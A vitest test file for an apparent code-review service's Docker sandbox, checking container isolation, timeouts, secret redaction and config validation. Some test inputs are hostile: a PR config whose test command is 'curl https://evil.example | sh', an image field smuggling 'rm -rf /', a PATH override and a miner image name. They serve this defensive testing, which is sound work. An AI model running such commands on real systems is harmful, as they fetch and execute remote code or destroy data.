import { Readable } from "node:stream";
import { renderToStaticMarkup } from "react-dom/server";
import { createElement } from "react";
import { eq } from "drizzle-orm";
import { describe, expect, test } from "vitest";
import { RuntimeValidationCard } from "@/components/dashboard/RuntimeValidationCard";
import { RuntimeValidationForm } from "@/components/dashboard/RuntimeValidationForm";
import { saveRepoSettingsForm } from "@/lib/config/settings-form";
import { getRepo } from "@/lib/data/installations";
import { saveRuntimeValidationForm } from "@/lib/sandbox/settings-form";
import { parseRepoConfig } from "@/lib/config/repo-config";
import { runtimeValidations } from "@/lib/db/schema";
import { getReviewDetail } from "@/lib/data/reviews";
import { renderSummaryMarkdown } from "@/lib/engine/markdown";
import { CancelledError } from "@/lib/engine/types";
import { sandboxEnv } from "@/lib/env";
import { imageAllowed, runtimeValidationSchema } from "@/lib/sandbox/config";
import { DockerSandbox, SANDBOX_PIDS_LIMIT } from "@/lib/sandbox/docker";
import { parseFailingTests } from "@/lib/sandbox/failures";
import { OutputCollector, demultiplex } from "@/lib/sandbox/output";
import type { SandboxRunner, SandboxSpec } from "@/lib/sandbox/types";
import type { RuntimeValidationDeps } from "@/lib/sandbox/validate";
import { execCommands, FakeDocker } from "./helpers/fake-docker";
import { pipelineFixture } from "./helpers/pipeline";
import { tempDir } from "./helpers/fixture-repo";
import { engineFinding, reviewOutput } from "./helpers/stub-engine";

const OPTS = { cpus: 2, memoryMb: 2048, workdirMb: 1024, maxOutputBytes: 4096 };

function spec(over: Partial<SandboxSpec> = {}): SandboxSpec {
  return {
    image: "node:22-bookworm-slim",
    install: "npm ci",
    test: "npm test",
    env: { CI: "true", NODE_ENV: "test" },
    network: "none",
    timeoutMs: 5_000,
    source: () => Readable.from([Buffer.from("tar-bytes")]),
    ...over,
  };
}

/** A token-shaped string assembled at runtime (no contiguous literal in the repository). */
const fakeToken = () => ["gh", "p_", "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"].join("");

describe("Docker sandbox", () => {
  test("R4.5 creates the container with no network, resource limits, a read-only root, no capabilities, no host mounts, and a non-root user", async () => {
    const docker = new FakeDocker();
    const sandbox = new DockerSandbox(docker, OPTS);
    const result = await sandbox.run(spec());
    expect(result.status).toBe("passed");

    const [create] = docker.find("POST", "/containers/create");
    const body = create!.json as Record<string, unknown> & { HostConfig: Record<string, unknown> };
    const volumeName = String(create!.query.name);
    expect(volumeName).toMatch(/^openreview-sbx-[0-9a-f]{16}$/);
    expect(body).toEqual({
      Image: "node:22-bookworm-slim",
      Entrypoint: ["sleep"],
      Cmd: ["125"],
      User: "1000:1000",
      WorkingDir: "/workspace",
      Env: ["HOME=/tmp", "TMPDIR=/tmp", "CI=true"],
      Labels: { "dev.openreview.sandbox": "true" },
      AttachStdin: false,
      AttachStdout: false,
      AttachStderr: false,
      OpenStdin: false,
      Tty: false,
      NetworkDisabled: true,
      HostConfig: {
        NetworkMode: "none",
        NanoCpus: 2_000_000_000,
        Memory: 2048 * 1024 * 1024,
        MemorySwap: 2048 * 1024 * 1024,
        PidsLimit: 256,
        ReadonlyRootfs: true,
        CapDrop: ["ALL"],
        CapAdd: [],
        SecurityOpt: ["no-new-privileges:true"],
        Privileged: false,
        Init: true,
        Binds: [],
        Devices: [],
        Mounts: [{ Type: "volume", Source: volumeName, Target: "/workspace", ReadOnly: false, VolumeOptions: { NoCopy: true } }],
        Tmpfs: { "/tmp": "rw,nosuid,nodev,size=1024m" },
        Ulimits: [{ Name: "nofile", Soft: 4096, Hard: 4096 }],
        LogConfig: { Type: "none", Config: {} },
        RestartPolicy: { Name: "no" },
        AutoRemove: false,
      },
    });
    expect(SANDBOX_PIDS_LIMIT).toBe(256);
    // The workdir is an in-memory (tmpfs) Docker volume owned by the sandbox user, never a host path.
    const [volume] = docker.find("POST", "/volumes/create");
    expect(volume!.json).toEqual({
      Name: volumeName,
      Driver: "local",
      DriverOpts: { type: "tmpfs", device: "tmpfs", o: "size=1024m,uid=1000,gid=1000,mode=0700" },
      Labels: { "dev.openreview.sandbox": "true" },
    });
    // The container and its volume are removed afterwards.
    expect(docker.find("DELETE", `/containers/${"c0ffee".repeat(10)}abcd`)).toHaveLength(1);
    expect(docker.find("DELETE", `/volumes/${volumeName}`)).toHaveLength(1);
  });

  test("R4.5 copies the source in through the archive API and runs the commands with sh -c through exec, with only the declared environment", async () => {
    const docker = new FakeDocker();
    const result = await new DockerSandbox(docker, OPTS).run(spec());
    const [upload] = docker.find("PUT", "/containers/*");
    expect(upload!.path).toMatch(/\/archive$/);
    expect(upload!.query).toEqual({ path: "/workspace", noOverwriteDirNonDir: true, copyUIDGID: true });
    expect(upload!.tar!.toString()).toBe("tar-bytes");
    // The archive arrives after the container started, before any command.
    const order = docker.calls.map((c) => `${c.method} ${c.path.replace(/[0-9a-f]{12,}/g, "<id>")}`);
    expect(order.indexOf("PUT /containers/<id>/archive")).toBeGreaterThan(order.indexOf("POST /containers/<id>/start"));
    expect(order.indexOf("PUT /containers/<id>/archive")).toBeLessThan(order.indexOf("POST /containers/<id>/exec"));

    expect(execCommands(docker)).toEqual(["npm ci", "npm test"]);
    for (const exec of docker.find("POST", "/containers/*").filter((c) => c.path.endsWith("/exec"))) {
      const body = exec.json as { Cmd: string[]; Env: string[]; User: string; Privileged: boolean };
      expect(body.Cmd.slice(0, 2)).toEqual(["sh", "-c"]);
      expect(body.User).toBe("1000:1000");
      expect(body.Privileged).toBe(false);
      expect(body.Env.sort()).toEqual(["CI=true", "HOME=/tmp", "NODE_ENV=test", "TMPDIR=/tmp"]);
    }
    expect(result.steps.map((s) => [s.step, s.exitCode])).toEqual([
      ["install", 0],
      ["test", 0],
    ]);
    // The worker's own environment (e.g. database or model credentials) never reaches the container.
    expect(JSON.stringify(docker.calls)).not.toContain(process.env.DATABASE_URL ?? "postgres://");
  });

  test("R4.5 kills and removes the container when the wall-clock timeout expires", async () => {
    const docker = new FakeDocker();
    docker.commands.set("npm test", { stdout: "running forever\n", hang: true });
    const result = await new DockerSandbox(docker, { ...OPTS, cleanupTimeoutMs: 1000 }).run(spec({ timeoutMs: 80 }));
    expect(result.status).toBe("timeout");
    expect(result.failedStep).toBe("test");
    expect(result.exitCode).toBeNull();
    expect(result.output).toContain("running forever");
    expect(result.output).toContain("exceeded its 0s limit");
    const id = `${"c0ffee".repeat(10)}abcd`;
    expect(docker.find("POST", `/containers/${id}/kill`)).toHaveLength(1);
    expect(docker.find("DELETE", `/containers/${id}`)).toHaveLength(1);
    expect(docker.find("DELETE", "/volumes/*")).toHaveLength(1);
  });

  test("R4.5 caps the captured output to its head and tail and redacts secrets", async () => {
    const docker = new FakeDocker();
    const noise = Array.from({ length: 400 }, (_, i) => `line ${i} ${"x".repeat(40)}`).join("\n");
    docker.commands.set("npm test", { exitCode: 1, stdout: `\u001b[31mFIRST LINE\u001b[0m\n${noise}\n`, stderr: `token=${fakeToken()}\nLAST LINE\n` });
    const result = await new DockerSandbox(docker, OPTS).run(spec({ install: null }));
    expect(result.status).toBe("failed");
    expect(result.truncated).toBe(true);
    expect(result.output).toContain("FIRST LINE");
    expect(result.output).toContain("LAST LINE");
    expect(result.output).toMatch(/bytes of output omitted/);
    expect(result.output).not.toContain(fakeToken());
    expect(result.output).not.toContain("\u001b");
    expect(Buffer.byteLength(result.output)).toBeLessThan(OPTS.maxOutputBytes + 200);
  });

  test("R4.5 maps exit codes to passed, failed (with the failing step), and error", async () => {
    const failingInstall = new FakeDocker();
    failingInstall.commands.set("npm ci", { exitCode: 1, stderr: "npm ERR! network unreachable\n" });
    const r1 = await new DockerSandbox(failingInstall, OPTS).run(spec());
    expect([r1.status, r1.failedStep, r1.exitCode]).toEqual(["failed", "install", 1]);
    expect(execCommands(failingInstall)).toEqual(["npm ci"]);

    const failingTests = new FakeDocker();
    failingTests.commands.set("npm test", { exitCode: 2 });
    const r2 = await new DockerSandbox(failingTests, OPTS).run(spec());
    expect([r2.status, r2.failedStep, r2.exitCode]).toEqual(["failed", "test", 2]);

    const oom = new FakeDocker();
    oom.commands.set("npm test", { exitCode: 137 });
    const r3 = await new DockerSandbox(oom, OPTS).run(spec());
    expect(r3.notes.join(" ")).toMatch(/memory limit/);

    const broken = new FakeDocker();
    broken.createStatus = 500;
    const r4 = await new DockerSandbox(broken, OPTS).run(spec());
    expect(r4.status).toBe("error");
    expect(r4.error).toContain("engine exploded");
    // The create may have happened despite the error: cleanup still removes by name, and the volume.
    expect(broken.find("DELETE", "/containers/*")).toHaveLength(1);
    expect(broken.find("DELETE", "/volumes/*")).toHaveLength(1);
  });

  test("R4.5 install-only network: the install step uses the registry proxy network, then the container is disconnected before the tests", async () => {
    const docker = new FakeDocker();
    const sandbox = new DockerSandbox(docker, { ...OPTS, registryProxy: "http://registry-proxy:3128", installNetwork: "sbx-install" });
    const result = await sandbox.run(spec({ network: "install-only" }));
    expect(result.status).toBe("passed");
    const create = docker.find("POST", "/containers/create")[0]!.json as { NetworkDisabled: boolean; HostConfig: { NetworkMode: string } };
    expect(create.HostConfig.NetworkMode).toBe("sbx-install");
    expect(create.NetworkDisabled).toBe(false);
    const execs = docker.find("POST", "/containers/*").filter((c) => c.path.endsWith("/exec"));
    expect((execs[0]!.json as { Env: string[] }).Env).toContain("HTTPS_PROXY=http://registry-proxy:3128");
    expect((execs[1]!.json as { Env: string[] }).Env.some((e) => /proxy/i.test(e))).toBe(false);
    const order = docker.calls.map((c) => c.path);
    const disconnect = order.indexOf("/networks/sbx-install/disconnect");
    expect(disconnect).toBeGreaterThan(-1);
    expect(disconnect).toBeLessThan(order.lastIndexOf(order.find((p) => p.endsWith("/exec"))!));

    // Still attached after the disconnect: the tests never run.
    const leaky = new FakeDocker();
    leaky.networksAfterDisconnect = { "sbx-install": {} };
    const r2 = await new DockerSandbox(leaky, { ...OPTS, registryProxy: "http://registry-proxy:3128", installNetwork: "sbx-install" }).run(spec({ network: "install-only" }));
    expect(r2.status).toBe("error");
    expect(execCommands(leaky)).toEqual(["npm ci"]);

    // Without a proxy the install runs offline, and that is reported.
    const offline = new FakeDocker();
    const r3 = await new DockerSandbox(offline, OPTS).run(spec({ network: "install-only" }));
    expect((offline.find("POST", "/containers/create")[0]!.json as { HostConfig: { NetworkMode: string } }).HostConfig.NetworkMode).toBe("none");
    expect(r3.notes.join(" ")).toMatch(/without network access/);
  });

  test("R4.5 a cancelled review kills the sandbox and stops with CancelledError", async () => {
    const docker = new FakeDocker();
    docker.commands.set("npm test", { hang: true });
    const controller = new AbortController();
    const running = new DockerSandbox(docker, OPTS).run(spec({ signal: controller.signal }));
    setTimeout(() => controller.abort(), 30);
    await expect(running).rejects.toBeInstanceOf(CancelledError);
    expect(docker.find("DELETE", "/containers/*")).toHaveLength(1);
  });

  test("R4.5 pulls a missing image with an explicit tag", async () => {
    const docker = new FakeDocker();
    await new DockerSandbox(docker, OPTS).run(spec({ image: "python" }));
    expect(docker.find("POST", "/images/create")[0]!.query).toEqual({ fromImage: "python:latest" });
  });
});

describe("output and failures", () => {
  test("R4.5 decodes Docker's multiplexed stream and keeps head and tail within the cap", async () => {
    const parts = [Buffer.from([1, 0, 0, 0, 0, 0, 0, 3]), Buffer.from("abc"), Buffer.from([2, 0, 0, 0, 0, 0, 0, 2]), Buffer.from("de")];
    const joined = Buffer.concat(parts);
    const got: string[] = [];
    // Frames split across chunk boundaries.
    await demultiplex(Readable.from([joined.subarray(0, 5), joined.subarray(5, 13), joined.subarray(13)]), (c) => got.push(c.toString()));
    expect(got.join("")).toBe("abcde");
    const out = new OutputCollector(10);
    out.write("0123456789ABCDEFGHIJ");
    expect(out.truncated).toBe(true);
    expect(out.text()).toMatch(/^01234\n… \[10 bytes of output omitted\] …\nFGHIJ$/);
  });

  test("R4.5 recognizes failing test names from jest, vitest, pytest, and go test output", () => {
    const output = [
      "  ● Cart › computes the total with tax",
      " FAIL  src/cart.test.ts > Cart > rounds to cents",
      "   × applies discounts (12 ms)",
      "FAILED tests/test_api.py::test_login - AssertionError: 401",
      "tests/test_api.py::test_logout FAILED",
      "--- FAIL: TestParse (0.00s)",
      "ok   example.com/pkg 0.01s",
    ].join("\n");
    expect(parseFailingTests(output)).toEqual([
      "Cart › computes the total with tax",
      "src/cart.test.ts > Cart > rounds to cents",
      "applies discounts",
      "tests/test_api.py::test_login",
      "tests/test_api.py::test_logout",
      "TestParse",
    ]);
  });

  test("R4.5 validates the runtimeValidation config: image references, environment names, and commands", () => {
    expect(runtimeValidationSchema.safeParse({ enabled: true, test: "npm test", image: "ghcr.io/acme/ci:1.2" }).success).toBe(true);
    expect(runtimeValidationSchema.safeParse({ enabled: true, test: "npm test", image: "node; rm -rf /" }).success).toBe(false);
    expect(runtimeValidationSchema.safeParse({ enabled: true, test: "npm test", env: { PATH: "/evil" } }).success).toBe(false);
    expect(runtimeValidationSchema.safeParse({ enabled: true, test: "npm test", env: { "BAD-NAME": "1" } }).success).toBe(false);
    expect(runtimeValidationSchema.safeParse({ enabled: true, test: "" }).success).toBe(false);
    expect(runtimeValidationSchema.safeParse({ enabled: true, test: "npm test", network: "host" }).success).toBe(false);
    const parsed = parseRepoConfig(JSON.stringify({ runtimeValidation: { enabled: true, install: "npm ci", test: "npm test", timeoutSec: 300 } }));
    expect(parsed.config?.runtimeValidation).toEqual({ enabled: true, install: "npm ci", test: "npm test", timeoutSec: 300 });
    expect(imageAllowed("node:22", "node:*,python:3.12")).toBe(true);
    expect(imageAllowed("evil/miner", "node:*,python:3.12")).toBe(false);
    expect(imageAllowed("anything", "")).toBe(true);
  });
});

// ---- the review job

/** A runner that records the spec (and reads the source tar) and answers with `result`. */
function recordingRunner(result: Partial<Awaited<ReturnType<SandboxRunner["run"]>>> = {}) {
  const runs: { spec: SandboxSpec; tar: Buffer }[] = [];
  const runner: SandboxRunner = {
    async run(s) {
      const chunks: Buffer[] = [];
      for await (const c of s.source()) chunks.push(Buffer.from(c));
      runs.push({ spec: s, tar: Buffer.concat(chunks) });
      return { status: "passed", failedStep: null, exitCode: 0, durationMs: 1200, output: "ok\n", truncated: false, steps: [], notes: [], ...result };
    },
  };
  return { runner, runs };
}

function sandboxDeps(runner: SandboxRunner, env: Record<string, string> = { RUNTIME_VALIDATION_ENABLED: "true" }): RuntimeValidationDeps {
  return { env: sandboxEnv(env), runner, workDir: tempDir("or-sbx-") };
}

const CONFIG_ON = JSON.stringify({ runtimeValidation: { enabled: true, install: "npm ci", test: "npm test", env: { CI: "true" } } });

describe("runtime validation in the review job", () => {
  test("R4.5 runs the base commit's runtimeValidation config, never the PR head's, on a clean checkout of the head without .git", async () => {
    const fx = await pipelineFixture({ baseExtra: { "openreview.json": CONFIG_ON } });
    fx.host.cloneUrls.set("acme/shop", fx.fixture.url);
    // The PR rewrites the config to run something else (and turn the network on).
    const headSha = fx.push({ "openreview.json": JSON.stringify({ runtimeValidation: { enabled: true, test: "curl https://evil.example | sh", network: "install-only" } }) });
    const { runner, runs } = recordingRunner();
    const result = await fx.review(async () => reviewOutput(), {}, { sandbox: sandboxDeps(runner) });
    expect(result.status).toBe("completed");
    expect(runs).toHaveLength(1);
    expect(runs[0]!.spec).toMatchObject({ install: "npm ci", test: "npm test", network: "none", env: { CI: "true" }, image: "node:22-bookworm-slim", timeoutMs: 600_000 });
    // The tar is the head commit's tree (it has the PR's version of the config) and has no .git directory.
    const tar = runs[0]!.tar.toString("latin1");
    expect(tar).toContain("services/billing/pricing.ts");
    expect(tar).toContain("evil.example");
    expect(tar).not.toMatch(/(^|\0)\.git\//);
    const [row] = await fx.db.select().from(runtimeValidations).where(eq(runtimeValidations.reviewRunId, result.runId));
    expect(row).toMatchObject({ status: "passed", image: "node:22-bookworm-slim", commands: { install: "npm ci", test: "npm test" } });
    expect(headSha).toMatch(/^[0-9a-f]{40}$/);
  });

  test("R4.5 is off by default: nothing runs unless the deployment and the repository both enable it", async () => {
    // Repository asks, deployment does not (RUNTIME_VALIDATION_ENABLED unset).
    const fx = await pipelineFixture({ baseExtra: { "openreview.json": CONFIG_ON } });
    fx.host.cloneUrls.set("acme/shop", fx.fixture.url);
    const { runner, runs } = recordingRunner();
    const r1 = await fx.review(async () => reviewOutput(), {}, { sandbox: sandboxDeps(runner, {}) });
    expect(r1.status).toBe("completed");
    expect(runs).toHaveLength(0);
    const [skipped] = await fx.db.select().from(runtimeValidations).where(eq(runtimeValidations.reviewRunId, r1.runId));
    expect(skipped).toMatchObject({ status: "skipped" });
    expect(skipped!.reason).toMatch(/RUNTIME_VALIDATION_ENABLED/);
    expect(sandboxEnv({}).RUNTIME_VALIDATION_ENABLED).toBe(false);

    // Deployment allows it, repository does not ask: no row, no section.
    const plain = await pipelineFixture();
    const { runner: r2, runs: runs2 } = recordingRunner();
    const res = await plain.review(async () => reviewOutput(), {}, { sandbox: sandboxDeps(r2) });
    expect(runs2).toHaveLength(0);
    expect(await plain.db.select().from(runtimeValidations).where(eq(runtimeValidations.reviewRunId, res.runId))).toHaveLength(0);
    const summary = plain.host.issueComments.get("acme/shop#7")?.[0]?.body ?? "";
    expect(summary).not.toContain("Runtime validation");
  });

  test("R4.5 attaches failures to the review summary and the dashboard review detail", async () => {
    const fx = await pipelineFixture({ baseExtra: { "openreview.json": CONFIG_ON } });
    fx.host.cloneUrls.set("acme/shop", fx.fixture.url);
    const log = ["$ npm test", "  ● Cart › computes the total with tax", "    expected 110 received 100", `secret: token=${fakeToken()}`, "[test exited with code 1]"].join("\n");
    const { runner } = recordingRunner({ status: "failed", failedStep: "test", exitCode: 1, durationMs: 42_000, output: log });
    const result = await fx.review(async () => reviewOutput({ findings: [engineFinding()] }), {}, { sandbox: sandboxDeps(runner) });
    expect(result.status).toBe("completed");

    const summary = fx.host.issueComments.get("acme/shop#7")![0]!.body;
    expect(summary).toContain("### Runtime validation");
    expect(summary).toContain("**Failed** — the test step `npm test` exited with code 1 after 42s");
    expect(summary).toContain("- `Cart › computes the total with tax`");
    expect(summary).toMatch(/<summary>Log tail<\/summary>\n\n```+text\n[\s\S]*expected 110 received 100/);
    // Redacted before it was stored (the runner's output is sanitized again on the way in).
    expect(summary).not.toContain(fakeToken());

    const [review] = await fx.db.select().from(runtimeValidations).where(eq(runtimeValidations.reviewRunId, result.runId));
    expect(review!.failingTests).toEqual(["Cart › computes the total with tax"]);
    const detail = await getReviewDetail(fx.db, "org_a", result.reviewId!);
    expect(detail!.runtimeValidation).toMatchObject({ status: "failed", failedStep: "test", command: "npm test", exitCode: 1, durationMs: 42_000 });
    const html = renderToStaticMarkup(createElement(RuntimeValidationCard, { validation: detail!.runtimeValidation! }));
    expect(html).toContain("Runtime validation");
    expect(html).toContain("expected 110 received 100");
    expect(html).toContain('data-validation-status="failed"');
  });

  test("R4.5 renders passed, timed-out, and unavailable validations in the summary", () => {
    const base = { image: "node:22", network: "none" as const, failedStep: null, command: "npm test", exitCode: 0, durationMs: 3000, outputExcerpt: "", failingTests: [], reason: null };
    expect(renderSummaryMarkdown(reviewOutput({ runtimeValidation: { ...base, status: "passed" } }))).toContain("**Passed** — `npm test` succeeded in 3s");
    expect(renderSummaryMarkdown(reviewOutput({ runtimeValidation: { ...base, status: "timeout", failedStep: "test", exitCode: null, durationMs: 600_000, outputExcerpt: "slow\n" } }))).toContain(
      "**Timed out** — the test step was killed after 10m 0s",
    );
    const err = renderSummaryMarkdown(reviewOutput({ runtimeValidation: { ...base, status: "error", reason: "Runtime validation could not run: <!-- openreview:summary -->" } }));
    expect(err).toContain("**Could not run**");
    expect(err.match(/<!-- openreview:summary -->/g)).toHaveLength(1);
  });
});

describe("runtime validation settings", () => {
  const form = (entries: [string, string][]) => {
    const f = new FormData();
    for (const [k, v] of entries) f.append(k, v);
    return f;
  };

  test("R4.5 owners and admins set a repository's runtime validation in the dashboard; review settings saves keep it; the review job uses it", async () => {
    const fx = await pipelineFixture();
    fx.host.cloneUrls.set("acme/shop", fx.fixture.url);
    const repoId = String(fx.repo.id);
    const valid = form([
      ["repoId", repoId],
      ["enabled", "true"],
      ["test", "pytest -q"],
      ["install", "pip install -r requirements.txt"],
      ["image", "python:3.12-slim"],
      ["timeoutSec", "300"],
      ["network", "none"],
      ["env", "CI=true\n# comment\nPYTHONDONTWRITEBYTECODE=1"],
    ]);
    expect(await saveRuntimeValidationForm(fx.db, { orgId: "org_a", role: "member" }, valid)).toEqual({ status: "forbidden" });
    expect(await saveRuntimeValidationForm(fx.db, { orgId: "org_b", role: "owner" }, valid)).toEqual({ status: "not_found" });
    const badEnv = form([["repoId", repoId], ["enabled", "true"], ["test", "x"], ["env", "NOT A LINE"]]);
    expect(await saveRuntimeValidationForm(fx.db, { orgId: "org_a", role: "admin" }, badEnv)).toMatchObject({ status: "invalid" });
    const noTest = form([["repoId", repoId], ["enabled", "true"], ["test", ""]]);
    expect(await saveRuntimeValidationForm(fx.db, { orgId: "org_a", role: "admin" }, noTest)).toMatchObject({ status: "invalid" });
    expect(await saveRuntimeValidationForm(fx.db, { orgId: "org_a", role: "admin" }, valid)).toEqual({ status: "saved" });
    const expected = { enabled: true, test: "pytest -q", install: "pip install -r requirements.txt", image: "python:3.12-slim", timeoutSec: 300, env: { CI: "true", PYTHONDONTWRITEBYTECODE: "1" } };
    expect((await getRepo(fx.db, "org_a", fx.repo.id))!.settings.runtimeValidation).toEqual(expected);

    // Saving the review settings form replaces its layer but keeps runtime validation.
    await saveRepoSettingsForm(fx.db, { orgId: "org_a", role: "admin" }, form([["repoId", repoId], ["mode", "fast"]]));
    expect((await getRepo(fx.db, "org_a", fx.repo.id))!.settings).toMatchObject({ mode: "fast", runtimeValidation: expected });

    const { runner, runs } = recordingRunner();
    await fx.review(async () => reviewOutput(), {}, { sandbox: sandboxDeps(runner, { RUNTIME_VALIDATION_ENABLED: "true", SANDBOX_TIMEOUT_SEC: "120" }) });
    // The deployment's limit caps the repository's timeout.
    expect(runs[0]!.spec).toMatchObject({ image: "python:3.12-slim", install: "pip install -r requirements.txt", test: "pytest -q", timeoutMs: 120_000, env: { CI: "true", PYTHONDONTWRITEBYTECODE: "1" } });

    // An allowlist that does not include the image refuses it.
    const { runner: r2, runs: runs2 } = recordingRunner();
    const blocked = await fx.review(async () => reviewOutput(), { full: true }, { sandbox: sandboxDeps(r2, { RUNTIME_VALIDATION_ENABLED: "true", SANDBOX_ALLOWED_IMAGES: "node:*" }) });
    expect(runs2).toHaveLength(0);
    const [row] = await fx.db.select().from(runtimeValidations).where(eq(runtimeValidations.reviewRunId, blocked.runId));
    expect(row).toMatchObject({ status: "error" });
    expect(row!.reason).toMatch(/not allowed/);

    // Clearing removes it.
    expect(await saveRuntimeValidationForm(fx.db, { orgId: "org_a", role: "owner" }, form([["repoId", repoId]]))).toEqual({ status: "cleared" });
    expect((await getRepo(fx.db, "org_a", fx.repo.id))!.settings.runtimeValidation).toBeUndefined();
    const html = renderToStaticMarkup(
      createElement(RuntimeValidationForm, { repoId: 1, value: expected, fromFile: true, serverEnabled: false, editable: true, returnTo: "/dashboard/repos/1", action: async () => undefined }),
    );
    expect(html).toContain("Runtime validation (beta)");
    expect(html).toContain("turned off on this server");
    expect(html).toContain("takes precedence");
    expect(html).toContain("PYTHONDONTWRITEBYTECODE=1");
  });
});
